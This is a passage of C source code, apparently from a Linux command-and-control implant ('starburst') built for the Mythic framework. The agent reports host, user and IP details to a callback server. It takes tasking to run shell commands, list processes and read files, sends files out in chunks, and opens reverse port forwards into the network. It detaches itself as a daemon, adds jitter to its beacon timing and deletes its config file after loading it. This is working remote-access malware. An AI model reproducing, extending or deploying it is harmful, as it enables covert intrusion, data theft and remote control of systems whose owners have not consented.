    char msg[128];
    snprintf(msg, sizeof(msg), "sleep=%ds jitter=%d%%", g_sleep_interval, g_sleep_jitter);
    queue_response(task_uuid, RSP_SUCCESS, msg);
}

/* ======== DOWNLOAD (agent -> mythic) ======== */

static void cmd_download_init(const char *task_uuid, parser_t *params) {
    char *filepath = pr_string(params);

    FILE *fp = fopen(filepath, "rb");
    if (!fp) {
        char err[256];
        snprintf(err, sizeof(err), "open: %s", strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
        free(filepath);
        return;
    }

    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    int slot = -1;
    for (int i = 0; i < MAX_DOWNLOADS; i++) {
        if (!g_downloads[i].active) { slot = i; break; }
    }
    if (slot < 0) {
        fclose(fp);
        queue_response(task_uuid, RSP_ERROR, "no download slots");
        free(filepath);
        return;
    }

    download_slot_t *dl = &g_downloads[slot];
    memset(dl, 0, sizeof(*dl));
    strncpy(dl->task_uuid, task_uuid, 39);
    strncpy(dl->file_path, filepath, 1023);
    dl->fp = fp;
    dl->total_size = (uint32_t)fsize;
    dl->sent = 0;
    dl->active = 1;
    dl->awaiting_file_id = 1;

    uint32_t total_chunks = (dl->total_size + CHUNK_SIZE - 1) / CHUNK_SIZE;
    if (total_chunks == 0) total_chunks = 1;

    /* queue DOWNLOAD_INIT response - sub-protocol bytes follow status directly */
    packer_t p;
    pk_init(&p);
    pk_byte(&p, ACTION_POST_RESPONSE);
    pk_string(&p, task_uuid);
    pk_byte(&p, RSP_PROCESSING);
    pk_byte(&p, DOWNLOAD_INIT);
    pk_int32(&p, total_chunks);
    pk_int32(&p, dl->total_size);
    pk_string(&p, filepath);

    rsp_queue(p.data, p.len);
    pk_free(&p);
    free(filepath);
}

static void cmd_download_resp(const char *task_uuid, parser_t *params) {
    char *file_id = pr_string(params);

    /* find matching download slot */
    for (int i = 0; i < MAX_DOWNLOADS; i++) {
        download_slot_t *dl = &g_downloads[i];
        if (!dl->active || !dl->awaiting_file_id) continue;
        if (strcmp(dl->task_uuid, task_uuid) != 0) continue;

        strncpy(dl->file_id, file_id, 39);
        dl->awaiting_file_id = 0;

        /* send all chunks */
        uint8_t *chunk_buf = (uint8_t *)malloc(CHUNK_SIZE);
        uint32_t chunk_num = 1;
        while (dl->sent < dl->total_size) {
            uint32_t to_read = dl->total_size - dl->sent;
            if (to_read > CHUNK_SIZE) to_read = CHUNK_SIZE;

            size_t rd = fread(chunk_buf, 1, to_read, dl->fp);
            if (rd == 0) break;

            int is_last = (dl->sent + (uint32_t)rd >= dl->total_size);

            packer_t p;
            pk_init(&p);
            pk_byte(&p, ACTION_POST_RESPONSE);
            pk_string(&p, task_uuid);
            pk_byte(&p, is_last ? RSP_SUCCESS : RSP_PROCESSING);
            pk_byte(&p, 0x11); /* DOWNLOAD_CHUNK */
            pk_int32(&p, chunk_num);
            pk_string(&p, dl->file_id);
            pk_bytes(&p, chunk_buf, (uint32_t)rd);

            rsp_queue(p.data, p.len);
            pk_free(&p);

            dl->sent += (uint32_t)rd;
            chunk_num++;
        }
        free(chunk_buf);

        /* final success response */
        fclose(dl->fp);
        dl->fp = NULL;
        dl->active = 0;
        queue_response(task_uuid, RSP_SUCCESS, "download complete");
        break;
    }
    free(file_id);
}

/* ================================================================
 *  COMMAND DISPATCH
 * ================================================================ */

/* ================================================================
 *  RPFWD - REVERSE PORT FORWARD
 * ================================================================ */

static void rpfwd_queue_response(uint32_t server_id, uint8_t *data, uint32_t data_len, int do_exit) {
    packer_t p;
    pk_init(&p);
    pk_byte(&p, ACTION_RPFWD_MSG);
    pk_int32(&p, server_id);
    pk_byte(&p, do_exit ? 1 : 0);
    pk_int32(&p, data_len);
    if (data && data_len > 0) {
        pk_ensure(&p, data_len);
        memcpy(p.data + p.len, data, data_len);
        p.len += data_len;
    }

    uint32_t needed = g_rsp_len + 4 + p.len;
    if (needed > g_rsp_cap) {
        uint32_t nc = g_rsp_cap ? g_rsp_cap : 4096;
        while (nc < needed) nc *= 2;
        g_rsp_buf = (uint8_t *)realloc(g_rsp_buf, nc);
        g_rsp_cap = nc;
    }
    uint8_t *qb = g_rsp_buf + g_rsp_len;
    qb[0] = (p.len >> 24) & 0xFF;
    qb[1] = (p.len >> 16) & 0xFF;
    qb[2] = (p.len >> 8)  & 0xFF;
    qb[3] = p.len & 0xFF;
    memcpy(qb + 4, p.data, p.len);
    g_rsp_len += 4 + p.len;
    pk_free(&p);
}

static rpfwd_conn_t *rpfwd_find(uint32_t server_id) {
    for (uint32_t i = 0; i < g_rpfwd.conn_count; i++) {
        if (g_rpfwd.conns[i].active && g_rpfwd.conns[i].server_id == server_id)
            return &g_rpfwd.conns[i];
    }
    return NULL;
}

static rpfwd_conn_t *rpfwd_alloc(uint32_t server_id) {
    for (uint32_t i = 0; i < RPFWD_MAX_CONNS; i++) {
        if (!g_rpfwd.conns[i].active) {
            g_rpfwd.conns[i].server_id = server_id;
            g_rpfwd.conns[i].sock = -1;
            g_rpfwd.conns[i].active = 1;
            g_rpfwd.conns[i].connected = 0;
            if (i >= g_rpfwd.conn_count) g_rpfwd.conn_count = i + 1;
            return &g_rpfwd.conns[i];
        }
    }
    return NULL;
}

static void rpfwd_close(rpfwd_conn_t *conn) {
    if (conn->sock >= 0) {
        close(conn->sock);
        conn->sock = -1;
    }
    conn->active = 0;
    conn->connected = 0;
}

static int rpfwd_connect(rpfwd_conn_t *conn) {
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%u", g_rpfwd.target_port);

    if (getaddrinfo(g_rpfwd.target_host, port_str, &hints, &res) != 0 || !res) {
        return -1;
    }

    int fd = socket(res->ai_family, SOCK_STREAM, 0);
    if (fd < 0) {
        freeaddrinfo(res);
        return -1;
    }

    struct timeval tv;
    tv.tv_sec = 10;
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) {
        close(fd);
        freeaddrinfo(res);
        return -1;
    }
    freeaddrinfo(res);

    /* set non-blocking after connect */
    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);

    conn->sock = fd;
    conn->connected = 1;
    return 0;
}

static void rpfwd_route(uint32_t server_id, uint8_t *data, uint32_t data_len, int do_exit) {
    rpfwd_conn_t *conn = rpfwd_find(server_id);

    if (do_exit) {
        if (conn) {
            rpfwd_close(conn);
            rpfwd_queue_response(server_id, NULL, 0, 1);
        }
        return;
    }

    if (!conn) {
        conn = rpfwd_alloc(server_id);
        if (!conn) {
            rpfwd_queue_response(server_id, NULL, 0, 1);
            return;
        }
        if (rpfwd_connect(conn) < 0) {
            rpfwd_close(conn);
            rpfwd_queue_response(server_id, NULL, 0, 1);
            return;
        }
#ifdef DEBUG_BUILD
        fprintf(stderr, "[rpfwd] connected server_id=%u to %s:%u\n",
                server_id, g_rpfwd.target_host, g_rpfwd.target_port);
#endif
    }

    if (conn->connected && data && data_len > 0) {
        uint32_t sent = 0;
        while (sent < data_len) {
            ssize_t ret = send(conn->sock, data + sent, data_len - sent, 0);
            if (ret > 0) {
                sent += ret;
            } else if (ret < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
                break;
            } else {
                rpfwd_close(conn);
                rpfwd_queue_response(server_id, NULL, 0, 1);
                return;
            }
        }
    }
}

static void rpfwd_poll(void) {
    if (!g_rpfwd.active) return;

    uint8_t buf[RPFWD_RECV_BUF];
    for (uint32_t i = 0; i < g_rpfwd.conn_count; i++) {
        rpfwd_conn_t *conn = &g_rpfwd.conns[i];
        if (!conn->active || !conn->connected) continue;

        ssize_t n = recv(conn->sock, buf, sizeof(buf), 0);
        if (n > 0) {
            rpfwd_queue_response(conn->server_id, buf, (uint32_t)n, 0);
        } else if (n == 0) {
            rpfwd_close(conn);
            rpfwd_queue_response(conn->server_id, NULL, 0, 1);
        } else if (errno != EAGAIN && errno != EWOULDBLOCK) {
            rpfwd_close(conn);
            rpfwd_queue_response(conn->server_id, NULL, 0, 1);
        }
    }
}

static void rpfwd_destroy(void) {
    for (uint32_t i = 0; i < g_rpfwd.conn_count; i++) {
        if (g_rpfwd.conns[i].active) rpfwd_close(&g_rpfwd.conns[i]);
    }
    g_rpfwd.active = 0;
    g_rpfwd.conn_count = 0;
    g_sleep_interval = g_rpfwd.saved_sleep;
}

static void cmd_rpfwd_handler(const char *task_uuid, parser_t *params) {
    char *action = pr_string(params);
    char *host = pr_string(params);
    uint32_t port = pr_int32(params);

    if (!action) {
        queue_response(task_uuid, RSP_ERROR, "missing action");
        free(action);
        free(host);
        return;
    }

    if (strcmp(action, "start") == 0) {
        if (g_rpfwd.active) {
            queue_response(task_uuid, RSP_ERROR, "rpfwd already active");
        } else if (!host || port == 0) {
            queue_response(task_uuid, RSP_ERROR, "missing remote_ip or remote_port");
        } else {
            memset(&g_rpfwd, 0, sizeof(g_rpfwd));
            g_rpfwd.active = 1;
            g_rpfwd.saved_sleep = g_sleep_interval;
            g_rpfwd.target_port = (uint16_t)port;
            strncpy(g_rpfwd.target_host, host, sizeof(g_rpfwd.target_host) - 1);
            g_sleep_interval = 0;
            queue_response(task_uuid, RSP_SUCCESS, "rpfwd started");
        }
    } else if (strcmp(action, "stop") == 0) {
        if (!g_rpfwd.active) {
            queue_response(task_uuid, RSP_ERROR, "rpfwd not active");
        } else {
            rpfwd_destroy();
            queue_response(task_uuid, RSP_SUCCESS, "rpfwd stopped");
        }
    } else {
        queue_response(task_uuid, RSP_ERROR, "unknown action: use start or stop");
    }

    free(action);
    free(host);
}

static void dispatch_task(uint8_t cmd_id, const char *task_uuid,
                          const uint8_t *param_data, uint32_t param_len) {
    parser_t params;
    pr_init(&params, param_data, param_len);

    switch (cmd_id) {
        case CMD_EXIT:
            queue_response(task_uuid, RSP_SUCCESS, "exiting");
            g_running = 0;
            break;
        case CMD_SLEEP:
            cmd_sleep_handler(task_uuid, &params);
            break;
        case CMD_SHELL:
        case CMD_RUN:
            cmd_shell(task_uuid, &params);
            break;
        case CMD_LS:
            cmd_ls(task_uuid, &params);
            break;
        case CMD_CD:
            cmd_cd(task_uuid, &params);
            break;
        case CMD_PWD:
            cmd_pwd(task_uuid);
            break;
        case CMD_WHOAMI:
            cmd_whoami(task_uuid);
            break;
        case CMD_CAT:
            cmd_cat(task_uuid, &params);
            break;
        case CMD_ENV:
            cmd_env(task_uuid);
            break;
        case CMD_PS:
            cmd_ps(task_uuid);
            break;
        case CMD_IFCONFIG:
            cmd_ifconfig(task_uuid);
            break;
        case CMD_MKDIR:
            cmd_mkdir_handler(task_uuid, &params);
            break;
        case CMD_RM:
            cmd_rm_handler(task_uuid, &params);
            break;
        case CMD_CP:
            cmd_cp_handler(task_uuid, &params);
            break;
        case CMD_MV:
            cmd_mv_handler(task_uuid, &params);
            break;
        case CMD_KILL:
            cmd_kill_handler(task_uuid, &params);
            break;
        case CMD_DOWNLOAD:
            cmd_download_init(task_uuid, &params);
            break;
        case DOWNLOAD_RESP_CMD:
            cmd_download_resp(task_uuid, &params);
            break;
        case CMD_RPFWD:
            cmd_rpfwd_handler(task_uuid, &params);
            break;
        default: {
            char msg[64];
            snprintf(msg, sizeof(msg), "unsupported command: 0x%02x", cmd_id);
            queue_response(task_uuid, RSP_ERROR, msg);
            break;
        }
    }
}

/* ================================================================
 *  CHECKIN
 * ================================================================ */

static int do_checkin(void) {
    struct utsname uts;
    uname(&uts);

    char hostname[256];
    gethostname(hostname, sizeof(hostname));

    struct passwd *pw = getpwuid(getuid());
    const char *username = pw ? pw->pw_name : "unknown";

    char os_str[128];
    snprintf(os_str, sizeof(os_str), "%s %s", uts.sysname, uts.release);

    /* get IPs */
    FILE *fp = popen("hostname -I 2>/dev/null || echo '127.0.0.1'", "r");
    char ip_buf[512] = "";
    if (fp) { fread(ip_buf, 1, sizeof(ip_buf) - 1, fp); pclose(fp); }
    /* trim trailing whitespace */
    size_t ilen = strlen(ip_buf);
    while (ilen > 0 && (ip_buf[ilen-1] == '\n' || ip_buf[ilen-1] == ' '))
        ip_buf[--ilen] = '\0';

    /* count IPs (space-separated) */
    int ip_count = 0;
    char *ips[32];
    char *tok = strtok(ip_buf, " \t");
    while (tok && ip_count < 32) {
        ips[ip_count++] = tok;
        tok = strtok(NULL, " \t");
    }

    /* build checkin TLV */
    packer_t p;
    pk_init(&p);
    pk_byte(&p, ACTION_CHECKIN);
    pk_string(&p, CFG_PAYLOAD_UUID);

    pk_int32(&p, (uint32_t)ip_count);
    for (int i = 0; i < ip_count; i++)
        pk_string(&p, ips[i]);

    pk_string(&p, os_str);       /* os */
    pk_string(&p, username);     /* user */
    pk_string(&p, hostname);     /* host */
    pk_int32(&p, (uint32_t)getpid()); /* pid */
    pk_string(&p, "x64");        /* arch */
    pk_string(&p, "");           /* domain */
    pk_int32(&p, 2);             /* integrity level (medium) */
    pk_string(&p, "");           /* external_ip */

    char proc_name[256] = "starburst";
    {
        char link[64];
        snprintf(link, sizeof(link), "/proc/%d/exe", getpid());
        ssize_t rn = readlink(link, proc_name, sizeof(proc_name) - 1);
        if (rn > 0) proc_name[rn] = '\0';
    }
    pk_string(&p, proc_name);    /* process_name */

    /* send checkin */
    uint32_t resp_len;
    uint8_t *resp = agent_send(p.data, p.len, &resp_len);
    pk_free(&p);

    if (!resp || resp_len < 2) {
        free(resp);
        return -1;
    }

    /* parse CHECKIN_RSP: [byte:0x04][string:callback_uuid] */
    parser_t rp;
    pr_init(&rp, resp, resp_len);
    uint8_t action = pr_byte(&rp);
    if (action != ACTION_CHECKIN_RSP) {
        free(resp);
        return -1;
    }

    char *callback_uuid = pr_string(&rp);
    strncpy(g_uuid, callback_uuid, 39);
    g_uuid[39] = '\0';

    free(callback_uuid);
    free(resp);
    return 0;
}

/* ================================================================
 *  TASKING LOOP
 * ================================================================ */

static void do_get_tasking(void) {
    /* poll rpfwd connections before building request */
    if (g_rpfwd.active) rpfwd_poll();

    packer_t p;
    pk_init(&p);
    pk_byte(&p, ACTION_GET_TASKING);

    /* attach pending responses */
    uint32_t sending_rsp = g_rsp_len;
    pk_int32(&p, g_rsp_len);
    if (g_rsp_len > 0) {
        pk_ensure(&p, g_rsp_len);
        memcpy(p.data + p.len, g_rsp_buf, g_rsp_len);
        p.len += g_rsp_len;
    }

#ifdef DEBUG_BUILD
    fprintf(stderr, "[beacon] sending %u bytes response data, total payload %u\n",
            sending_rsp, p.len);
#endif

    uint32_t resp_len;
    uint8_t *resp = agent_send(p.data, p.len, &resp_len);
    pk_free(&p);

    if (!resp || resp_len < 2) {
#ifdef DEBUG_BUILD
        fprintf(stderr, "[beacon] agent_send failed or empty response (resp=%p len=%u)\n",
                (void*)resp, resp_len);
#endif
        free(resp);
        return;
    }

    /* send succeeded - clear response queue */
    g_rsp_len = 0;

    parser_t rp;
    pr_init(&rp, resp, resp_len);
    uint8_t action = pr_byte(&rp);
    if (action != ACTION_GET_TASKING) {
        free(resp);
        return;
    }

    uint32_t task_count = pr_int32(&rp);
#ifdef DEBUG_BUILD
    fprintf(stderr, "[beacon] received %u tasks, response payload %u bytes\n",
            task_count, resp_len);
#endif
    for (uint32_t i = 0; i < task_count; i++) {
        uint8_t cmd_id = pr_byte(&rp);

        /* 36-byte task UUID (fixed, not length-prefixed) */
        char task_uuid[40] = {0};
        pr_raw(&rp, (uint8_t *)task_uuid, 36);

        uint32_t params_len = pr_int32(&rp);
        const uint8_t *params_data = NULL;
        if (params_len > 0 && pr_remaining(&rp) >= params_len) {
            params_data = rp.data + rp.off;
            rp.off += params_len;
        }

#ifdef DEBUG_BUILD
        fprintf(stderr, "[task] cmd=0x%02x uuid=%.8s params=%u\n", cmd_id, task_uuid, params_len);
#endif
        dispatch_task(cmd_id, task_uuid, params_data ? params_data : (uint8_t *)"", params_len);
#ifdef DEBUG_BUILD
        fprintf(stderr, "[task] done cmd=0x%02x\n", cmd_id);
#endif
    }

    /* parse additional sections (rpfwd datagrams) */
    while (pr_remaining(&rp) > 0) {
        uint8_t section_action = pr_byte(&rp);
        if (section_action == ACTION_RPFWD_MSG && g_rpfwd.active) {
            uint32_t rpfwd_count = pr_int32(&rp);
            for (uint32_t ri = 0; ri < rpfwd_count; ri++) {
                uint32_t rid = pr_int32(&rp);
                uint8_t rexit = pr_byte(&rp);
                uint32_t rdata_len = pr_int32(&rp);
                uint8_t *rdata = NULL;
                if (rdata_len > 0 && pr_remaining(&rp) >= rdata_len) {
                    rdata = (uint8_t *)(rp.data + rp.off);
                    rp.off += rdata_len;
                }
                rpfwd_route(rid, rdata, rdata_len, rexit != 0);
            }
        } else {
            break;
        }
    }

#ifdef DEBUG_BUILD
    fprintf(stderr, "[beacon] do_get_tasking returning, g_running=%d\n", g_running);
#endif
    free(resp);
}

/* ================================================================
 *  MAIN
 * ================================================================ */

/* ================================================================
 *  CONFIG FILE LOADING
 *  Format: key=value, one per line. Supported keys:
 *    uuid, aes_key, host, port, uri, sleep, jitter
 *  Agent reads config, then deletes the file.
 * ================================================================ */

static void load_config_file(const char *path) {
    FILE *fp = fopen(path, "r");
    if (!fp) return;

    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        /* strip newline */
        size_t len = strlen(line);
        while (len > 0 && (line[len-1] == '\n' || line[len-1] == '\r'))
            line[--len] = '\0';

        char *eq = strchr(line, '=');
        if (!eq) continue;
        *eq = '\0';
        char *key = line;
        char *val = eq + 1;

        if (strcmp(key, "uuid") == 0) {
            strncpy(g_uuid, val, 39);
        } else if (strcmp(key, "aes_key") == 0) {
            hex_to_bytes(val, g_aes_key, 32);
        } else if (strcmp(key, "host") == 0) {
            strncpy(g_callback_host, val, sizeof(g_callback_host) - 1);
        } else if (strcmp(key, "port") == 0) {
            g_callback_port = atoi(val);
        } else if (strcmp(key, "uri") == 0) {
            strncpy(g_post_uri, val, sizeof(g_post_uri) - 1);
        } else if (strcmp(key, "sleep") == 0) {
            g_sleep_interval = atoi(val);
        } else if (strcmp(key, "jitter") == 0) {
            g_sleep_jitter = atoi(val);
        }
    }
    fclose(fp);

    unlink(path);
}

int main(int argc, char **argv) {
    signal(SIGPIPE, SIG_IGN);

    /* init config from compile-time defaults */
    strncpy(g_uuid, CFG_PAYLOAD_UUID, 39);
    hex_to_bytes(CFG_AES_KEY_HEX, g_aes_key, 32);
    strncpy(g_callback_host, CFG_CALLBACK_HOST, sizeof(g_callback_host) - 1);
    g_callback_port = CFG_CALLBACK_PORT;
    strncpy(g_post_uri, CFG_POST_URI, sizeof(g_post_uri) - 1);
    g_sleep_interval = CFG_SLEEP_INTERVAL;
    g_sleep_jitter = CFG_SLEEP_JITTER;

    /* override from config file if provided */
    if (argc > 1 && argv[1][0] != '-') {
        load_config_file(argv[1]);
    }

    memset(g_downloads, 0, sizeof(g_downloads));

    if (ssl_init() != 0) {
        return 1;
    }

    /* daemon: detach from terminal if not debug */
#ifndef DEBUG_BUILD
    if (fork() > 0) _exit(0);
    setsid();
    if (fork() > 0) _exit(0);
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
#endif

    /* checkin loop - retry until success */
    while (g_running) {
        if (do_checkin() == 0) break;
        sleep(g_sleep_interval);
    }

    /* main tasking loop */
    while (g_running) {
#ifdef DEBUG_BUILD
        fprintf(stderr, "[loop] top, sleep_interval=%d jitter=%d\n", g_sleep_interval, g_sleep_jitter);
#endif
        do_get_tasking();

        int s = g_sleep_interval;
        if (s == 0) {
            usleep(50000); /* 50ms poll interval for rpfwd/proxy mode */
        } else {
            if (g_sleep_jitter > 0) {
                int jitter = (s * g_sleep_jitter) / 100;
                if (jitter > 0) s += (rand() % (2 * jitter + 1)) - jitter;
                if (s < 1) s = 1;
            }
#ifdef DEBUG_BUILD
            fprintf(stderr, "[loop] sleeping %d seconds\n", s);
#endif
            sleep((unsigned int)s);
        }
    }

    /* flush any remaining responses (e.g. exit acknowledgment) */
    if (g_rsp_len > 0) {
        do_get_tasking();
    }

    if (g_ssl_ctx) SSL_CTX_free(g_ssl_ctx);
    free(g_rsp_buf);
    return 0;
}
